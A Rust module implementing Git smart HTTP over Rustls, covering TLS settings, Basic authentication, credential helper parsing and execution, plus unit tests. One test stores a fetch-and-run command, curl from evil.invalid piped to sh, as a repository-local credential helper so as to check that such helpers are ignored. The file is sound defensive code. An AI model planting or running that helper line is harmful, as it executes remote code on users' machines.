//! Git smart HTTP over Rustls. Authentication and deadlines belong to one
//! operation; neither credentials nor repository configuration are global.

use std::io::{self, Read, Write};
use std::sync::{Arc, Mutex};
use ui::time::{Duration, Instant};

use git2::transport::{Service, SmartSubtransport, SmartSubtransportStream, Transport};
use reqwest::blocking::{Client, Response};
use reqwest::header::{ACCEPT, CONTENT_TYPE, WWW_AUTHENTICATE};
use reqwest::{Method, StatusCode};
use url::Url;
use zeroize::Zeroizing;

const MAX_UPLOAD_BYTES: usize = 256 * 1024 * 1024;
const MAX_RESPONSE_BYTES: u64 = 2 * 1024 * 1024 * 1024;
const OPERATION_TIMEOUT: Duration = Duration::from_secs(180);
const REQUEST_TIMEOUT: Duration = Duration::from_secs(60);

pub(super) fn register() -> Result<(), git2::Error> {
    // SAFETY: transport::with_context's shared OnceLock serializes registration
    // before all application network operations. The factories retain no globals.
    unsafe {
        git2::transport::register("http", factory)?;
        git2::transport::register("https", factory)
    }
}

fn failure(message: &str) -> git2::Error {
    git2::Error::new(
        git2::ErrorCode::GenericError,
        git2::ErrorClass::Net,
        message,
    )
}

fn factory(remote: &git2::Remote<'_>) -> Result<Transport, git2::Error> {
    let config = crate::transport::current_config()?;
    if config.get_bool("http.sslVerify").ok() == Some(false) {
        return Err(failure(
            "disabling Git HTTPS certificate verification is not supported",
        ));
    }
    let mut builder = tilo_net::http::blocking_client()
        .tls_backend_rustls()
        .connect_timeout(Duration::from_secs(10))
        .timeout(REQUEST_TIMEOUT)
        // Redirects must never move credential scope to another origin or
        // downgrade HTTPS. Report a moved remote instead of silently following.
        .redirect(reqwest::redirect::Policy::none())
        .user_agent("git/tilo");
    match config.get_path("http.sslCAInfo") {
        Ok(path) => {
            const MAX_CA_BYTES: u64 = 4 * 1024 * 1024;
            let file = std::fs::File::open(path)
                .map_err(|_| failure("could not open Git HTTPS CA bundle"))?;
            if !file
                .metadata()
                .map_err(|_| failure("could not inspect Git HTTPS CA bundle"))?
                .is_file()
            {
                return Err(failure("Git HTTPS CA bundle must be a regular file"));
            }
            let mut pem = Vec::new();
            file.take(MAX_CA_BYTES + 1)
                .read_to_end(&mut pem)
                .map_err(|_| failure("could not read Git HTTPS CA bundle"))?;
            if u64::try_from(pem.len()).unwrap_or(u64::MAX) > MAX_CA_BYTES {
                return Err(failure("Git HTTPS CA bundle exceeds 4 MiB"));
            }
            let certificates = reqwest::Certificate::from_pem_bundle(&pem)
                .map_err(|_| failure("invalid Git HTTPS CA bundle"))?;
            if certificates.is_empty() {
                return Err(failure("Git HTTPS CA bundle contains no certificates"));
            }
            for certificate in certificates {
                builder = builder.add_root_certificate(certificate);
            }
        }
        Err(error) if error.code() == git2::ErrorCode::NotFound => {}
        Err(_) => return Err(failure("invalid Git HTTPS CA bundle configuration")),
    }
    let client = builder
        .build()
        .map_err(|_| failure("could not initialize the Git TLS client"))?;
    // Push URLs can differ from fetch URLs; action() supplies the actual URL.
    let settings = HelperSettings::from_config(&config, remote)?;
    Transport::smart(
        remote,
        true,
        HttpTransport {
            client,
            settings,
            session: Mutex::new(None),
        },
    )
}

struct HttpTransport {
    client: Client,
    settings: HelperSettings,
    session: Mutex<Option<Arc<Mutex<Session>>>>,
}

impl SmartSubtransport for HttpTransport {
    fn action(
        &self,
        raw_url: &str,
        service: Service,
    ) -> Result<Box<dyn SmartSubtransportStream>, git2::Error> {
        let mut slot = self
            .session
            .lock()
            .map_err(|_| failure("Git HTTP state unavailable"))?;
        let session = if let Some(session) = slot.as_ref() {
            Arc::clone(session)
        } else {
            let session = Arc::new(Mutex::new(Session::new(
                raw_url,
                self.client.clone(),
                &self.settings,
            )?));
            *slot = Some(Arc::clone(&session));
            session
        };
        drop(slot);
        let guard = session
            .lock()
            .map_err(|_| failure("Git HTTP state unavailable"))?;
        if guard.original_url != raw_url {
            return Err(failure("Git HTTP remote changed during an operation"));
        }
        drop(guard);
        let (service_name, advertisement) = match service {
            Service::UploadPackLs => ("git-upload-pack", true),
            Service::UploadPack => ("git-upload-pack", false),
            Service::ReceivePackLs => ("git-receive-pack", true),
            Service::ReceivePack => ("git-receive-pack", false),
        };
        let response = if advertisement {
            Some(
                session
                    .lock()
                    .map_err(|_| failure("Git HTTP state unavailable"))?
                    .request(service_name, true, &[])?,
            )
        } else {
            None
        };
        Ok(Box::new(HttpStream {
            session,
            service_name,
            response,
            upload: Vec::new(),
            received: 0,
            advertisement,
        }))
    }

    fn close(&self) -> Result<(), git2::Error> {
        // Keep credentials and the overall deadline through all RPC rounds.
        Ok(())
    }
}

struct Session {
    original_url: String,
    base: Url,
    client: Client,
    helper: Helper,
    credentials: Option<(Zeroizing<String>, Zeroizing<String>)>,
    helper_tried: bool,
    deadline: Instant,
}

impl Session {
    fn new(raw_url: &str, client: Client, settings: &HelperSettings) -> Result<Self, git2::Error> {
        let mut base = Url::parse(raw_url).map_err(|_| failure("invalid Git HTTP URL"))?;
        if !matches!(base.scheme(), "http" | "https")
            || base.host_str().is_none()
            || base.query().is_some()
            || base.fragment().is_some()
            || base.password().is_some()
        {
            return Err(failure(
                "Git HTTP requires an HTTP(S) URL without query, fragment, or embedded password",
            ));
        }
        let helper = settings.for_url(raw_url)?;
        base.set_username("")
            .map_err(|()| failure("invalid Git HTTP username"))?;
        let deadline = ui::time::now()
            .checked_add(OPERATION_TIMEOUT)
            .ok_or_else(|| failure("Git HTTP deadline exceeds the clock range"))?;
        Ok(Self {
            original_url: raw_url.to_owned(),
            base,
            client,
            helper,
            credentials: None,
            helper_tried: false,
            deadline,
        })
    }

    fn remaining(&self) -> Result<Duration, git2::Error> {
        self.deadline
            .checked_duration_since(ui::time::now())
            .filter(|remaining| !remaining.is_zero())
            .ok_or_else(|| failure("Git HTTP operation timed out"))
    }

    fn request(
        &mut self,
        service: &str,
        advertisement: bool,
        body: &[u8],
    ) -> Result<Response, git2::Error> {
        let mut endpoint = self.base.clone();
        let suffix = if advertisement { "info/refs" } else { service };
        endpoint.set_path(&format!(
            "{}/{suffix}",
            self.base.path().trim_end_matches('/')
        ));
        if advertisement {
            endpoint.set_query(Some(&format!("service={service}")));
        }
        let expected = format!(
            "application/x-{service}-{}",
            if advertisement {
                "advertisement"
            } else {
                "result"
            }
        );
        loop {
            let method = if advertisement {
                Method::GET
            } else {
                Method::POST
            };
            let mut request = self
                .client
                .request(method, endpoint.clone())
                .timeout(self.remaining()?.min(REQUEST_TIMEOUT))
                .header(ACCEPT, &expected);
            if !advertisement {
                request = request
                    .header(CONTENT_TYPE, format!("application/x-{service}-request"))
                    .body(body.to_owned());
            }
            if let Some((username, password)) = &self.credentials {
                request = request.basic_auth(username.as_str(), Some(password.as_str()));
            }
            let response = request.send().map_err(|error| network_error(&error))?;
            if response.status() == StatusCode::UNAUTHORIZED && !self.helper_tried {
                self.helper_tried = true;
                let basic = response
                    .headers()
                    .get_all(WWW_AUTHENTICATE)
                    .iter()
                    .filter_map(|header| header.to_str().ok())
                    .any(offers_basic);
                if !basic {
                    return Err(failure(
                        "Git server did not offer supported HTTP Basic authentication",
                    ));
                }
                let timeout = self.remaining()?.min(Duration::from_secs(5));
                self.credentials = Some(self.helper.execute(timeout)?);
                continue;
            }
            if response.status() == StatusCode::UNAUTHORIZED {
                return Err(git2::Error::new(
                    git2::ErrorCode::Auth,
                    git2::ErrorClass::Net,
                    "authentication failed: Git server rejected the supplied credentials",
                ));
            }
            if !response.status().is_success() {
                return Err(failure(&format!(
                    "Git HTTP server returned status {}",
                    response.status().as_u16()
                )));
            }
            let content_type = response
                .headers()
                .get(CONTENT_TYPE)
                .and_then(|value| value.to_str().ok())
                .and_then(|value| value.split(';').next());
            if content_type != Some(expected.as_str()) {
                return Err(failure(
                    "Git server did not return the expected smart HTTP content type",
                ));
            }
            return Ok(response);
        }
    }
}

fn network_error(error: &reqwest::Error) -> git2::Error {
    if is_certificate_error(error) {
        return git2::Error::new(
            git2::ErrorCode::Certificate,
            git2::ErrorClass::Net,
            "Git HTTPS certificate verification failed",
        );
    }
    failure(if error.is_timeout() {
        "Git HTTP request timed out"
    } else {
        "Git HTTP request failed"
    })
}

fn is_certificate_error(error: &(dyn std::error::Error + 'static)) -> bool {
    if matches!(
        error.downcast_ref::<rustls::Error>(),
        Some(rustls::Error::InvalidCertificate(_) | rustls::Error::NoCertificatesPresented)
    ) {
        return true;
    }
    // io::Error::source delegates to its boxed error's source, which can omit
    // the Rustls error itself. Inspect get_ref before continuing the chain.
    if let Some(error) = error.downcast_ref::<io::Error>()
        && let Some(inner) = error.get_ref()
        && is_certificate_error(inner)
    {
        return true;
    }
    error.source().is_some_and(is_certificate_error)
}

fn offers_basic(value: &str) -> bool {
    // Commas separate challenges or parameters, except inside quoted strings.
    // A parameter such as `Basic="..."` is not an authentication scheme.
    let is_basic = |part: &str| {
        let mut words = part.split_whitespace();
        words
            .next()
            .is_some_and(|scheme| scheme.eq_ignore_ascii_case("basic"))
            && !words.next().is_some_and(|word| word.starts_with('='))
    };
    let mut quoted = false;
    let mut escaped = false;
    let mut start = 0;
    for (index, character) in value.char_indices() {
        if escaped {
            escaped = false;
        } else if quoted && character == '\\' {
            escaped = true;
        } else if character == '"' {
            quoted = !quoted;
        } else if character == ',' && !quoted {
            if value.get(start..index).is_some_and(is_basic) {
                return true;
            }
            start = index.saturating_add(1);
        }
    }
    !quoted && value.get(start..).is_some_and(is_basic)
}

struct HttpStream {
    session: Arc<Mutex<Session>>,
    service_name: &'static str,
    response: Option<Response>,
    upload: Vec<u8>,
    received: u64,
    advertisement: bool,
}

impl Read for HttpStream {
    fn read(&mut self, buffer: &mut [u8]) -> io::Result<usize> {
        if buffer.is_empty() {
            return Ok(0);
        }
        if self.response.is_none() {
            let response = self
                .session
                .lock()
                .map_err(|_| io::Error::other("Git HTTP state unavailable"))?
                .request(self.service_name, false, &self.upload)
                .map_err(|error| io::Error::other(error.message().to_owned()))?;
            self.response = Some(response);
            self.upload = Vec::new();
        }
        let response = self
            .response
            .as_mut()
            .ok_or_else(|| io::Error::other("Git HTTP response missing"))?;
        let count = response
            .read(buffer)
            .map_err(|_| io::Error::other("Git HTTP response read failed"))?;
        self.received = self
            .received
            .checked_add(u64::try_from(count).map_err(io::Error::other)?)
            .ok_or_else(|| io::Error::other("Git HTTP response too large"))?;
        if self.received > MAX_RESPONSE_BYTES {
            return Err(io::Error::other("Git HTTP response exceeds 2 GiB"));
        }
        Ok(count)
    }
}

impl Write for HttpStream {
    fn write(&mut self, bytes: &[u8]) -> io::Result<usize> {
        if self.advertisement || self.response.is_some() {
            return Err(io::Error::other("Git HTTP request already sent"));
        }
        let size = self
            .upload
            .len()
            .checked_add(bytes.len())
            .ok_or_else(|| io::Error::other("Git HTTP upload too large"))?;
        if size > MAX_UPLOAD_BYTES {
            return Err(io::Error::other("Git HTTP upload exceeds 256 MiB"));
        }
        self.upload.extend_from_slice(bytes);
        Ok(bytes.len())
    }
    fn flush(&mut self) -> io::Result<()> {
        Ok(())
    }
}

/// Copy configuration before crossing the smart-transport Send boundary.
struct HelperSettings(Vec<(String, Helper)>);

impl HelperSettings {
    fn from_config(config: &git2::Config, remote: &git2::Remote<'_>) -> Result<Self, git2::Error> {
        let mut entries = Vec::new();
        for raw_url in [Some(remote.url()?), remote.pushurl()?]
            .into_iter()
            .flatten()
        {
            let Ok(url) = Url::parse(raw_url) else {
                continue;
            };
            if matches!(url.scheme(), "http" | "https") {
                entries.push((
                    raw_url.to_owned(),
                    Helper::from_config(config, raw_url, &url)?,
                ));
            }
        }
        Ok(Self(entries))
    }

    fn for_url(&self, raw_url: &str) -> Result<Helper, git2::Error> {
        self.0
            .iter()
            .find(|(configured, _)| configured == raw_url)
            .map(|(_, helper)| helper.clone())
            .ok_or_else(|| failure("Git HTTP remote has no matching credential scope"))
    }
}

/// Whether a `credential.helper` entry at `level` names a program the person
/// or the system chose, rather than one written into a checkout.
fn helper_level_is_trusted(level: git2::ConfigLevel) -> bool {
    !matches!(
        level,
        git2::ConfigLevel::Local | git2::ConfigLevel::Worktree | git2::ConfigLevel::App
    )
}

impl Helper {
    fn from_config(config: &git2::Config, raw_url: &str, url: &Url) -> Result<Self, git2::Error> {
        let origin = url.origin().ascii_serialization();
        // Apply broad helpers first, preserving multivar order. An explicit
        // empty helper clears all earlier helpers before more-specific entries.
        let mut keys = vec!["credential".to_owned(), format!("credential.{origin}")];
        let exact = format!("credential.{raw_url}");
        if !keys.contains(&exact) {
            keys.push(exact);
        }
        let mut commands = Vec::new();
        for key in &keys {
            let mut entries = match config.multivar(&format!("{key}.helper"), None) {
                Ok(entries) => entries,
                Err(error) if error.code() == git2::ErrorCode::NotFound => continue,
                Err(error) => return Err(error),
            };
            while let Some(entry) = entries.next() {
                let entry = entry?;
                // A helper is a program this app runs; a repository's own
                // configuration is content anyone who can write the checkout
                // can set. Helpers are honoured from the person's and the
                // system's levels only — like `core.sshCommand`, which the SSH
                // transport refuses for the same reason.
                if !helper_level_is_trusted(entry.level()) {
                    continue;
                }
                let value = entry
                    .value()
                    .map_err(|_| failure("Git credential helper is not valid text"))?;
                if value.is_empty() {
                    commands.clear();
                } else {
                    commands.push(value.to_owned());
                }
            }
        }
        let username = if url.username().is_empty() {
            keys.iter()
                .rev()
                .find_map(|key| config.get_string(&format!("{key}.username")).ok())
        } else {
            Some(url.username().to_owned())
        };
        let use_path = keys
            .iter()
            .rev()
            .find_map(|key| config.get_bool(&format!("{key}.useHttpPath")).ok())
            .unwrap_or(false);
        let host = match url.port() {
            Some(port) => format!("{}:{port}", url.host_str().unwrap_or_default()),
            None => url.host_str().unwrap_or_default().to_owned(),
        };
        Ok(Self {
            commands,
            username,
            protocol: url.scheme().to_owned(),
            host,
            path: use_path.then(|| url.path().trim_start_matches('/').to_owned()),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Credential configuration: fetch and push capture their own, the helper
    /// snapshot ignores later edits, non-default ports stay isolated, and an empty
    /// scoped helper resets prior entries while keeping order. Each phase is a former test with its own fresh fixture.
    #[test]
    fn credential_configuration_is_captured_per_operation_and_origin() {
        fetch_and_push_capture_their_own_credential_configuration();
        helper_snapshot_is_independent_of_later_repository_edits();
        credential_origin_keeps_nondefault_ports_isolated();
        scoped_empty_helper_resets_prior_multivars_then_keeps_order();
        a_repositorys_own_helper_is_never_run();
    }

    /// Configuration at the global level — where a person's own
    /// `~/.gitconfig` sits, the level a helper may be taken from.
    fn trusted_config(root: &std::path::Path) -> git2::Config {
        let path = root.join("trusted.gitconfig");
        std::fs::write(&path, "").unwrap();
        let mut config = git2::Config::new().unwrap();
        config
            .add_file(&path, git2::ConfigLevel::Global, false)
            .unwrap();
        config
    }

    fn a_repositorys_own_helper_is_never_run() {
        let root = tempfile::tempdir().unwrap();
        let repository = git2::Repository::init(root.path()).unwrap();
        let raw_url = "https://example.invalid/project.git";
        let url = Url::parse(raw_url).unwrap();
        // The checkout's own configuration names a helper: anyone who can
        // write the working tree can write this, so it must not run.
        let mut local = repository.config().unwrap();
        local
            .set_str(
                "credential.helper",
                "!curl -s https://evil.invalid/x.sh | sh",
            )
            .unwrap();
        local
            .set_str(&format!("credential.{raw_url}.helper"), "repo-scoped")
            .unwrap();
        assert!(
            Helper::from_config(&local, raw_url, &url)
                .unwrap()
                .commands
                .is_empty(),
            "a helper from the repository's own configuration must be ignored"
        );
        // The person's helper is honoured, and the checkout can neither add
        // to it nor clear it.
        let trusted_path = root.path().join("trusted.gitconfig");
        std::fs::write(&trusted_path, "[credential]\n\thelper = person-chosen\n").unwrap();
        let mut merged = git2::Config::new().unwrap();
        merged
            .add_file(&trusted_path, git2::ConfigLevel::Global, false)
            .unwrap();
        merged
            .add_file(
                &root.path().join(".git/config"),
                git2::ConfigLevel::Local,
                false,
            )
            .unwrap();
        local.set_str("credential.helper", "").unwrap();
        assert_eq!(
            Helper::from_config(&merged, raw_url, &url)
                .unwrap()
                .commands,
            vec!["person-chosen"],
            "the checkout can neither add a helper nor clear the person's"
        );
    }

    fn fetch_and_push_capture_their_own_credential_configuration() {
        let root = tempfile::tempdir().unwrap();
        let repository = git2::Repository::init(root.path()).unwrap();
        let fetch = "https://fetch.example.invalid/project.git";
        let push = "https://push.example.invalid/project.git";
        repository.remote("origin", fetch).unwrap();
        repository.remote_set_pushurl("origin", Some(push)).unwrap();
        let mut config = trusted_config(root.path());
        config.set_str("credential.helper", "").unwrap();
        config
            .set_str(&format!("credential.{fetch}.username"), "reader")
            .unwrap();
        config
            .set_str(&format!("credential.{push}.username"), "writer")
            .unwrap();
        config
            .set_str(&format!("credential.{fetch}.helper"), "fetch-helper")
            .unwrap();
        config
            .set_str(&format!("credential.{push}.helper"), "push-helper")
            .unwrap();
        let remote = repository.find_remote("origin").unwrap();
        let settings = HelperSettings::from_config(&config, &remote).unwrap();
        let read = settings.for_url(fetch).unwrap();
        let write = settings.for_url(push).unwrap();
        assert_eq!(read.username.as_deref(), Some("reader"));
        assert_eq!(write.username.as_deref(), Some("writer"));
        assert_eq!(read.commands, vec!["fetch-helper"]);
        assert_eq!(write.commands, vec!["push-helper"]);
        assert!(
            settings
                .for_url("https://other.example.invalid/project.git")
                .is_err()
        );
    }

    fn helper_snapshot_is_independent_of_later_repository_edits() {
        let root = tempfile::tempdir().unwrap();
        let repository = git2::Repository::init(root.path()).unwrap();
        let remote_url = "https://example.invalid/project.git";
        repository.remote("origin", remote_url).unwrap();
        let mut config = repository.config().unwrap();
        config.set_str("credential.username", "original").unwrap();
        let remote = repository.find_remote("origin").unwrap();
        let settings = HelperSettings::from_config(&config, &remote).unwrap();
        config.set_str("credential.username", "changed").unwrap();
        assert_eq!(
            settings.for_url(remote_url).unwrap().username.as_deref(),
            Some("original")
        );
    }

    fn credential_origin_keeps_nondefault_ports_isolated() {
        let root = tempfile::tempdir().unwrap();
        let mut config = trusted_config(root.path());
        config.set_str("credential.helper", "").unwrap();
        config
            .set_str("credential.https://example.invalid.helper", "default-port")
            .unwrap();
        config
            .set_str(
                "credential.https://example.invalid:8443.helper",
                "other-port",
            )
            .unwrap();
        config
            .set_str(
                "credential.https://example.invalid.username",
                "default-user",
            )
            .unwrap();
        config
            .set_str(
                "credential.https://example.invalid:8443.username",
                "other-user",
            )
            .unwrap();
        let raw_url = "https://example.invalid:8443/project.git";
        let helper = Helper::from_config(&config, raw_url, &Url::parse(raw_url).unwrap()).unwrap();
        assert_eq!(helper.commands, vec!["other-port"]);
        assert_eq!(helper.username.as_deref(), Some("other-user"));
        assert_eq!(helper.host, "example.invalid:8443");
    }

    fn scoped_empty_helper_resets_prior_multivars_then_keeps_order() {
        let root = tempfile::tempdir().unwrap();
        let mut config = trusted_config(root.path());
        config.set_str("credential.helper", "").unwrap();
        config
            .set_multivar("credential.helper", "^never-match$", "global-first")
            .unwrap();
        config
            .set_multivar("credential.helper", "^never-match$", "global-second")
            .unwrap();
        let origin_key = "credential.https://example.invalid:8443.helper";
        config.set_str(origin_key, "").unwrap();
        config
            .set_multivar(origin_key, "^never-match$", "scoped-first")
            .unwrap();
        config
            .set_multivar(origin_key, "^never-match$", "scoped-second")
            .unwrap();
        let raw_url = "https://example.invalid:8443/project.git";
        let url = Url::parse(raw_url).unwrap();
        let helper = Helper::from_config(&config, raw_url, &url).unwrap();
        assert_eq!(helper.commands, vec!["scoped-first", "scoped-second"]);
        let exact_key = format!("credential.{raw_url}.helper");
        config.set_str(&exact_key, "").unwrap();
        assert!(
            Helper::from_config(&config, raw_url, &url)
                .unwrap()
                .commands
                .is_empty()
        );
    }

    /// HTTP protocol edges: Basic challenges parse outside quoted parameters and
    /// boxed TLS certificate errors keep their classification. Each phase is a former test with its own fresh fixture.
    #[test]
    fn http_challenges_and_tls_errors_are_classified() {
        basic_challenges_are_parsed_outside_quoted_parameters();
        boxed_tls_certificate_errors_keep_their_classification();
    }

    fn basic_challenges_are_parsed_outside_quoted_parameters() {
        assert!(offers_basic("Negotiate, Basic realm=\"git\""));
        assert!(offers_basic(
            "Digest realm=\"a,b\", nonce=\"token\", bAsIc realm=\"git\""
        ));
        assert!(offers_basic("Basic"));
        assert!(!offers_basic("Digest realm=\"a, Basic hidden\""));
        assert!(!offers_basic("Digest realm=\"a\\\", Basic hidden\""));
        assert!(!offers_basic("Digest realm=\"git\", Basic=\"parameter\""));
        assert!(!offers_basic("Digest realm=\"git\", Basic =\"parameter\""));
    }

    fn boxed_tls_certificate_errors_keep_their_classification() {
        let error = io::Error::new(
            io::ErrorKind::InvalidData,
            rustls::Error::InvalidCertificate(rustls::CertificateError::UnknownIssuer),
        );
        assert!(is_certificate_error(&error));
        assert!(!is_certificate_error(&io::Error::new(
            io::ErrorKind::ConnectionRefused,
            "refused"
        )));
        assert!(!is_certificate_error(&io::Error::new(
            io::ErrorKind::TimedOut,
            "timeout"
        )));
    }

    /// Credential helper command lines: native executables keep quotes, spaces and
    /// backslashes; relative helpers keep the git- prefix and POSIX quoting; absolute
    /// POSIX paths survive on every platform; shell scripts and expansion are kept.
    /// Each phase is a former test with its own fresh fixture.
    #[test]
    fn credential_helper_commands_preserve_paths_quoting_and_scripts() {
        native_helper_executables_preserve_quotes_spaces_and_backslashes();
        relative_helpers_keep_git_prefix_and_posix_argument_quoting();
        posix_absolute_helpers_keep_their_shell_paths_on_every_platform();
        configured_shell_scripts_and_expansion_are_preserved();
    }

    fn native_helper_executables_preserve_quotes_spaces_and_backslashes() {
        for (command, expected) in [
            (
                r#""C:\Program Files\Git\git-credential-custom.exe" --mode='owned fixture'"#,
                r"C:\Program Files\Git\git-credential-custom.exe",
            ),
            (
                r"C:\Tools\git-credential-custom.exe --mode='owned fixture'",
                r"C:\Tools\git-credential-custom.exe",
            ),
            (
                r"\\server\share\git-credential-custom.exe --mode='owned fixture'",
                r"\\server\share\git-credential-custom.exe",
            ),
        ] {
            let parsed = parse_helper_command(command).unwrap();
            let HelperCommand::Process {
                executable,
                arguments,
                shell_command,
            } = parsed
            else {
                panic!("expected process")
            };
            assert_eq!(executable, expected);
            assert_eq!(arguments, vec!["--mode=owned fixture"]);
            assert!(shell_command.starts_with(&format!("'{expected}'")));
            assert!(!requires_shell(&shell_command));
        }
    }

    fn relative_helpers_keep_git_prefix_and_posix_argument_quoting() {
        let command = r"store --file='C:/user'\''s credential store'";
        let HelperCommand::Process {
            executable,
            arguments,
            shell_command,
        } = parse_helper_command(command).unwrap()
        else {
            panic!("expected process")
        };
        assert_eq!(executable, "git");
        assert_eq!(
            arguments,
            vec!["credential-store", "--file=C:/user's credential store"]
        );
        assert_eq!(shell_command, format!("git credential-{command}"));
        assert!(!requires_shell(&shell_command));
    }

    fn posix_absolute_helpers_keep_their_shell_paths_on_every_platform() {
        for command in [
            "/mingw64/bin/git-credential-custom.exe --mode=test",
            "'/mingw64/bin/git-credential-custom.exe' --mode=test",
        ] {
            let HelperCommand::Process {
                executable,
                arguments,
                shell_command,
            } = parse_helper_command(command).unwrap()
            else {
                panic!("expected process")
            };
            assert_eq!(executable, "/mingw64/bin/git-credential-custom.exe");
            assert_eq!(arguments, vec!["--mode=test"]);
            assert_eq!(shell_command, command);
        }
    }

    fn configured_shell_scripts_and_expansion_are_preserved() {
        let script = r#"f() { printf '%s\n' "$HOME"; }; f"#;
        assert_eq!(
            parse_helper_command(&format!("!{script}")).unwrap(),
            HelperCommand::Shell(script.into())
        );
        let command = r#"store --file="$HOME/.git-credentials""#;
        let HelperCommand::Process { shell_command, .. } = parse_helper_command(command).unwrap()
        else {
            panic!("expected process")
        };
        assert_eq!(shell_command, format!("git credential-{command}"));
        assert!(requires_shell(&shell_command));
        assert!(!requires_shell(
            "git credential-store --file='$HOME/literal'"
        ));
    }
}

#[derive(Clone)]
struct Helper {
    commands: Vec<String>,
    username: Option<String>,
    protocol: String,
    host: String,
    path: Option<String>,
}

#[derive(Debug, PartialEq, Eq)]
enum HelperCommand {
    Shell(String),
    Process {
        executable: String,
        arguments: Vec<String>,
        shell_command: String,
    },
}

fn native_absolute_path(value: &str) -> bool {
    value.starts_with("\\\\")
        || value.starts_with("//")
        || matches!(value.as_bytes(), [drive, b':', b'\\' | b'/', ..] if drive.is_ascii_alphabetic())
}

fn parse_helper_command(command: &str) -> Result<HelperCommand, git2::Error> {
    if let Some(script) = command.strip_prefix('!') {
        return Ok(HelperCommand::Shell(script.to_owned()));
    }
    let command = command.trim();
    let quote = command
        .chars()
        .next()
        .filter(|character| matches!(character, '\'' | '"'));
    let candidate = if quote.is_some() {
        command.get(1..).unwrap_or_default()
    } else {
        command
    };
    let mut native_shell_command = None;
    let words = if native_absolute_path(candidate) {
        // A native Windows executable is a path, not POSIX escape syntax.
        // Only its argument tail uses the Git helper's shell-style quoting.
        let end = if let Some(quote) = quote {
            candidate
                .find(quote)
                .ok_or_else(|| failure("unterminated Git helper executable quote"))?
        } else {
            candidate
                .find(char::is_whitespace)
                .unwrap_or(candidate.len())
        };
        let executable = candidate
            .get(..end)
            .ok_or_else(|| failure("invalid Git helper executable"))?;
        let tail_start = end.saturating_add(usize::from(quote.is_some()));
        let tail = candidate.get(tail_start..).unwrap_or_default();
        if quote.is_some() && !tail.is_empty() && !tail.starts_with(char::is_whitespace) {
            return Err(failure(
                "Git helper executable quote must end at an argument boundary",
            ));
        }
        native_shell_command = Some(format!("'{}'{tail}", executable.replace('\'', "'\\''")));
        let mut words = vec![executable.to_owned()];
        words.extend(
            shlex::split(tail)
                .ok_or_else(|| failure("invalid quoting in Git credential helper"))?,
        );
        words
    } else {
        shlex::split(command).ok_or_else(|| failure("invalid quoting in Git credential helper"))?
    };
    let mut words = words.into_iter();
    let executable = words
        .next()
        .filter(|value| !value.is_empty())
        .ok_or_else(|| failure("empty Git credential helper"))?;
    let mut arguments: Vec<_> = words.collect();
    if native_absolute_path(&executable)
        || executable.starts_with('/')
        || std::path::Path::new(&executable).is_absolute()
    {
        Ok(HelperCommand::Process {
            executable,
            arguments,
            shell_command: native_shell_command.unwrap_or_else(|| command.to_owned()),
        })
    } else {
        arguments.insert(0, format!("credential-{executable}"));
        Ok(HelperCommand::Process {
            executable: "git".into(),
            arguments,
            shell_command: format!("git credential-{command}"),
        })
    }
}

fn requires_shell(command: &str) -> bool {
    let mut quote = None;
    let mut escaped = false;
    for character in command.chars() {
        if escaped {
            escaped = false;
            continue;
        }
        if character == '\\' && quote != Some('\'') {
            escaped = true;
            continue;
        }
        if quote == Some('\'') {
            if character == '\'' {
                quote = None;
            }
        } else if character == '"' {
            quote = if quote == Some('"') { None } else { Some('"') };
        } else if character == '\'' && quote.is_none() {
            quote = Some('\'');
        } else if matches!(character, '$' | '`')
            || (quote.is_none()
                && matches!(
                    character,
                    '*' | '?' | '[' | '~' | '|' | '&' | ';' | '<' | '>' | '(' | ')'
                ))
        {
            return true;
        }
    }
    false
}

/// Runs one configured credential helper's `get`, preserving trusted Git
/// helper shell syntax where a shell exists. Remote protocol/host/path/username
/// are supplied only via stdin.
fn run_helper_command(
    command: &str,
    input: &[u8],
    deadline: Instant,
    remaining: Duration,
) -> Result<Result<bounded_command::Output, bounded_command::Error>, git2::Error> {
    Ok(match parse_helper_command(command)? {
        HelperCommand::Shell(script) => bounded_command::run(
            "sh",
            &["-c", &format!("{script} get")],
            Some(input),
            64 * 1024,
            remaining,
        ),
        HelperCommand::Process {
            executable,
            arguments,
            shell_command,
        } => {
            let result = bounded_command::run(
                "sh",
                &["-c", &format!("{shell_command} get")],
                Some(input),
                64 * 1024,
                remaining,
            );
            match result {
                Err(bounded_command::Error::Process(error))
                    if error.kind() == io::ErrorKind::NotFound =>
                {
                    if requires_shell(&shell_command) {
                        return Err(failure(
                            "configured Git credential helper requires an installed shell for expansion",
                        ));
                    }
                    let mut arguments: Vec<_> = arguments.iter().map(String::as_str).collect();
                    arguments.push("get");
                    let remaining = deadline
                        .checked_duration_since(ui::time::now())
                        .ok_or_else(|| failure("Git credential helper timed out"))?;
                    bounded_command::run(&executable, &arguments, Some(input), 64 * 1024, remaining)
                }
                result => result,
            }
        }
    })
}

impl Helper {
    fn execute(
        &self,
        timeout: Duration,
    ) -> Result<(Zeroizing<String>, Zeroizing<String>), git2::Error> {
        let deadline = ui::time::now()
            .checked_add(timeout)
            .ok_or_else(|| failure("credential deadline unavailable"))?;
        let mut username = self.username.clone().map(Zeroizing::new);
        let mut password = None;
        for command in &self.commands {
            let mut input =
                Zeroizing::new(format!("protocol={}\nhost={}\n", self.protocol, self.host));
            if let Some(path) = &self.path {
                input.push_str("path=");
                input.push_str(path);
                input.push('\n');
            }
            if let Some(username) = &username {
                if username.contains(['\r', '\n', '\0']) {
                    return Err(failure("invalid credential username"));
                }
                input.push_str("username=");
                input.push_str(username.as_str());
                input.push('\n');
            }
            input.push('\n');
            let remaining = deadline
                .checked_duration_since(ui::time::now())
                .ok_or_else(|| failure("Git credential helper timed out"))?;
            let Ok(output) = run_helper_command(command, input.as_bytes(), deadline, remaining)?
            else {
                return Err(failure("Git credential helper failed or timed out"));
            };
            let stdout = Zeroizing::new(output.stdout);
            let _stderr = Zeroizing::new(output.stderr);
            if !output.status.success() {
                continue;
            }
            let text = std::str::from_utf8(&stdout)
                .map_err(|_| failure("Git credential helper returned invalid text"))?;
            for line in text.lines() {
                if line.is_empty() {
                    break;
                }
                if let Some(value) = line.strip_prefix("username=") {
                    if username.is_none() {
                        username = Some(Zeroizing::new(value.to_owned()));
                    }
                } else if let Some(value) = line.strip_prefix("password=")
                    && password.is_none()
                {
                    password = Some(Zeroizing::new(value.to_owned()));
                }
            }
            if username.is_some() && password.is_some() {
                break;
            }
        }
        match (username, password) {
            (Some(username), Some(password)) => Ok((username, password)),
            _ => Err(failure(
                "authentication failed: configure a Git credential helper",
            )),
        }
    }
}
